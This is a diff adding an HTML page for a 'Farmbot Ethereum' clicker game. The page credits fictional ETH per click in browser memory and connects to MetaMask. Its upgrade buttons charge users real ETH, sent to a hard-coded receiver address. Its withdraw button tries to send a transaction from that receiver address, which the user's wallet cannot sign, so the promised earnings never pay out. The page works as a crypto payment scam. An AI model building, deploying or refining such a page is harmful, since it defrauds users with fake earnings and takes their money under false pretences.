@@ -1,0 +1,491 @@
+<html><head><base href="/">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Farmbot Ethereum</title>
+    <style>
+        body {
+            background: linear-gradient(to bottom, #0f2027, #203a43, #2c5364);
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(white, rgba(255,255,255,0) 2px);
+            background-size: 50px 50px;
+            animation: stars 20s linear infinite;
+            z-index: -1;
+        }
+
+        @keyframes stars {
+            from {
+                transform: translateY(0);
+            }
+            to {
+                transform: translateY(100%);
+            }
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 20px;
+            backdrop-filter: blur(5px);
+            margin: 20px;
+            box-shadow: 0 0 20px rgba(0, 255, 157, 0.2);
+        }
+
+        h1 {
+            text-shadow: 0 0 10px #00ff9d;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+        }
+
+        .wallet-info {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px 20px;
+            border-radius: 15px;
+            margin: 10px 0;
+            border: 1px solid rgba(0, 255, 157, 0.3);
+            display: none;
+        }
+
+        .spaceship {
+            cursor: pointer;
+            transition: transform 0.1s;
+            margin: 20px 0;
+            filter: drop-shadow(0 0 10px rgba(0, 255, 157, 0.5));
+            width: 200px;
+            height: 200px;
+            border-radius: 50%; /* Make it circular */
+            object-fit: cover; /* Ensure image fills circle */
+        }
+
+        .spaceship:hover {
+            filter: drop-shadow(0 0 15px rgba(0, 255, 157, 0.8));
+        }
+
+        .counter, .eth-counter {
+            font-size: 24px;
+            margin: 20px 0;
+            text-shadow: 0 0 5px currentColor;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px 20px;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .counter { color: #00ff9d; }
+        .eth-counter { color: #7cb9e8; }
+
+        .button-container {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .connect-wallet, .upgrades-btn {
+            padding: 15px 30px;
+            border-radius: 25px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .withdraw-btn {
+            padding: 10px 20px;
+            border-radius: 15px;
+            color: white;
+            font-size: 14px;
+            cursor: pointer;
+            border: none;
+            background: linear-gradient(45deg, #32CD32, #228B22);
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .withdraw-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(50, 205, 50, 0.3);
+        }
+
+        .upgrades-btn {
+            background: linear-gradient(45deg, #ff6b6b, #ee4343);
+        }
+
+        .connect-wallet:hover, .upgrades-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+        }
+
+        .withdraw-notice {
+            color: #aaa;
+            font-size: 12px;
+            margin-top: 5px;
+            opacity: 0.8;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+        }
+
+        .modal-content {
+            background: rgba(0, 0, 0, 0.8);
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #00ff9d;
+            width: 80%;
+            max-width: 500px;
+            border-radius: 15px;
+            color: white;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0, 255, 157, 0.2);
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .upgrade-item {
+            background: rgba(0, 0, 0, 0.5);
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(0, 255, 157, 0.3);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .upgrade-item:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 15px rgba(0, 255, 157, 0.3);
+        }
+
+        .buy-btn {
+            background: linear-gradient(45deg, #00ff9d, #00bf8f);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            color: white;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .buy-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 10px rgba(0, 255, 157, 0.5);
+        }
+
+        .clicks-limit {
+            color: #ff6b6b;
+            font-size: 18px;
+            margin: 10px 0;
+        }
+
+        .timer {
+            color: #ff6b6b;
+            font-size: 16px;
+            margin: 10px 0;
+            padding: 5px 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 107, 107, 0.3);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Farmbot Ethereum</h1>
+        <div class="counter">Clicks: <span id="clickCount">0</span></div>
+        <div class="eth-counter">ETH: <span id="ethCount">0.00000</span></div>
+        <div class="wallet-info" id="walletInfo">Wallet: <span id="walletAddress">Not Connected</span></div>
+        <div class="clicks-limit">Clicks remaining this hour: <span id="clicksRemaining">60</span></div>
+        <div class="timer" id="timer" style="display: none">
+            Next reset in: <span id="timerValue">60:00</span>
+        </div>
+        
+        <svg class="spaceship" id="clickerShip" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <linearGradient id="shipGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                    <stop offset="0%" style="stop-color:#7cb9e8"/>
+                    <stop offset="50%" style="stop-color:#00ff9d"/>
+                    <stop offset="100%" style="stop-color:#ffffff"/>
+                </linearGradient>
+            </defs>
+            <path d="M100 20 L160 140 L100 120 L40 140 Z" fill="url(#shipGradient)" stroke="#ffffff" stroke-width="2"/>
+            <circle cx="100" cy="70" r="20" fill="#ffffff" opacity="0.5"/>
+            <path d="M70 140 L100 180 L130 140" fill="#7cb9e8"/>
+        </svg>
+
+        <div class="button-container">
+            <button class="connect-wallet" id="connectWallet">Connect Metamask</button>
+            <button class="upgrades-btn" id="upgradesBtn">Upgrades</button>
+        </div>
+        <button class="withdraw-btn" id="withdrawBtn">Withdraw ETH</button>
+        <div class="withdraw-notice">withdraw min: 0.025 ETH</div>
+        </div>
+    </div>
+
+    <div id="upgradesModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Available Upgrades</h2>
+            <div class="upgrade-item">
+                <h3>Double Click Speed (x2)</h3>
+                <p>Cost: 0.005 ETH</p>
+                <p>Doubles your clicks per hour limit</p>
+                <button class="buy-btn" id="buyDouble">Buy Upgrade</button>
+            </div>
+            <div class="upgrade-item">
+                <h3>Quadruple Click Speed (x4)</h3>
+                <p>Cost: 0.01 ETH</p>
+                <p>Quadruples your clicks per hour limit</p>
+                <button class="buy-btn" id="buyQuad">Buy Upgrade</button>
+            </div>
+        </div>
+    </div>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+<script>
+    let clicks = 0;
+    let eth = 0;
+    let clicksRemaining = 60;
+    let maxClicksPerHour = 60;
+    let web3;
+    let userAccount;
+    
+    const ethPerClick = 0.00001;
+    const RECEIVER_ADDRESS = '0x180A3a1AF44365c63418C09250FC51fb3523EE96';
+    const clickSound = new Audio('https://www.soundjay.com/button/sounds/button-09.mp3');
+
+    let timerInterval;
+    const timerElement = document.getElementById('timer');
+    const timerValueElement = document.getElementById('timerValue');
+
+    const clickCount = document.getElementById('clickCount');
+    const ethCount = document.getElementById('ethCount');
+    const walletInfo = document.getElementById('walletInfo');
+    const walletAddress = document.getElementById('walletAddress');
+    const spaceship = document.getElementById('clickerShip');
+    const modal = document.getElementById('upgradesModal');
+    const upgradesBtn = document.getElementById('upgradesBtn');
+    const closeBtn = document.getElementsByClassName('close')[0];
+    const connectWalletBtn = document.getElementById('connectWallet');
+    const clicksRemainingElement = document.getElementById('clicksRemaining');
+
+    setInterval(() => {
+        clicksRemaining = maxClicksPerHour;
+        clicksRemainingElement.textContent = clicksRemaining;
+        clearInterval(timerInterval);
+        timerElement.style.display = 'none';
+    }, 3600000);
+
+    spaceship.addEventListener('click', () => {
+        if (clicksRemaining > 0) {
+            clicks++;
+            eth += ethPerClick;
+            clickCount.textContent = clicks;
+            ethCount.textContent = eth.toFixed(5);
+            clicksRemaining--;
+            clicksRemainingElement.textContent = clicksRemaining;
+            clickSound.play();
+            
+            spaceship.style.transform = 'scale(0.95)';
+            setTimeout(() => {
+                spaceship.style.transform = 'scale(1)';
+            }, 100);
+
+            if (clicksRemaining === 0) {
+                startTimer();
+            }
+        }
+    });
+
+    function startTimer() {
+        timerElement.style.display = 'block';
+        let timeLeft = 3600;
+        
+        updateTimerDisplay(timeLeft);
+        
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            updateTimerDisplay(timeLeft);
+            
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerElement.style.display = 'none';
+            }
+        }, 1000);
+    }
+
+    function updateTimerDisplay(seconds) {
+        const minutes = Math.floor(seconds / 60);
+        const remainingSeconds = seconds % 60;
+        timerValueElement.textContent = `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
+    }
+
+    upgradesBtn.onclick = () => modal.style.display = "block";
+    closeBtn.onclick = () => modal.style.display = "none";
+    window.onclick = (event) => {
+        if (event.target == modal) {
+            modal.style.display = "none";
+        }
+    };
+
+    connectWalletBtn.addEventListener('click', async () => {
+        if (typeof window.ethereum !== 'undefined') {
+            if (!userAccount) {
+                try {
+                    web3 = new Web3(window.ethereum);
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    userAccount = accounts[0];
+                    
+                    walletInfo.style.display = 'block';
+                    walletAddress.textContent = userAccount.slice(0, 6) + '...' + userAccount.slice(-4);
+                    
+                    connectWalletBtn.textContent = 'Disconnect Wallet';
+                    connectWalletBtn.style.background = 'linear-gradient(45deg, #00ff9d, #00bf8f)';
+                } catch (error) {
+                    console.error(error);
+                    alert('Failed to connect to Metamask');
+                }
+            } else {
+                userAccount = null;
+                web3 = null;
+                walletInfo.style.display = 'none';
+                walletAddress.textContent = 'Not Connected';
+                connectWalletBtn.textContent = 'Connect Metamask';
+                connectWalletBtn.style.background = '';
+            }
+        } else {
+            alert('Please install Metamask!');
+        }
+    });
+
+    document.getElementById('withdrawBtn').addEventListener('click', async () => {
+        if (!userAccount) {
+            alert('Please connect your wallet first!');
+            return;
+        }
+
+        if (eth <= 0) {
+            alert('No ETH available to withdraw!');
+            return;
+        }
+
+        if (eth < 0.025) {
+            alert('Minimum withdrawal amount is 0.025 ETH');
+            return;
+        }
+
+        try {
+            const amountWei = web3.utils.toWei(eth.toString(), 'ether');
+            await web3.eth.sendTransaction({
+                from: RECEIVER_ADDRESS,
+                to: userAccount,
+                value: amountWei
+            });
+            
+            eth = 0;
+            ethCount.textContent = eth.toFixed(5);
+            alert('Withdrawal successful!');
+        } catch (error) {
+            console.error(error);
+            alert('Withdrawal failed! Please try again.');
+        }
+    });
+    async function sendTransaction(amount) {
+        if (!userAccount) {
+            alert('Please connect your wallet first!');
+            return false;
+        }
+
+        try {
+            const amountWei = web3.utils.toWei(amount.toString(), 'ether');
+            await web3.eth.sendTransaction({
+                from: userAccount,
+                to: RECEIVER_ADDRESS,
+                value: amountWei
+            });
+            return true;
+        } catch (error) {
+            console.error(error);
+            alert('Transaction failed!');
+            return false;
+        }
+    }
+
+    document.getElementById('buyDouble').addEventListener('click', async () => {
+        if (await sendTransaction(0.005)) {
+            maxClicksPerHour *= 2;
+            clicksRemaining = maxClicksPerHour;
+            clicksRemainingElement.textContent = clicksRemaining;
+            alert('Upgrade successful! Your clicks per hour limit is now ' + maxClicksPerHour);
+        }
+    });
+
+    document.getElementById('buyQuad').addEventListener('click', async () => {
+        if (await sendTransaction(0.01)) {
+            maxClicksPerHour *= 4;
+            clicksRemaining = maxClicksPerHour;
+            clicksRemainingElement.textContent = clicksRemaining;
+            alert('Upgrade successful! Your clicks per hour limit is now ' + maxClicksPerHour);
+        }
+    });
+
+    function createStars() {
+        const stars = 200;
+        const container = document.createElement('div');
+        container.style.position = 'fixed';
+        container.style.width = '100%';
+        container.style.height = '100%';
+        container.style.zIndex = '-2';
+        
+        for (let i = 0; i < stars; i++) {
+            const star = document.createElement('div');
+            star.style.position = 'absolute';
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.width = '2px';
+            star.style.height = '2px';
+            star.style.background = 'white';
+            star.style.borderRadius = '50%';
+            container.appendChild(star);
+        }
+        
+        document.body.appendChild(container);
+    }
+
+    createStars();
+</script>
+</body></html>
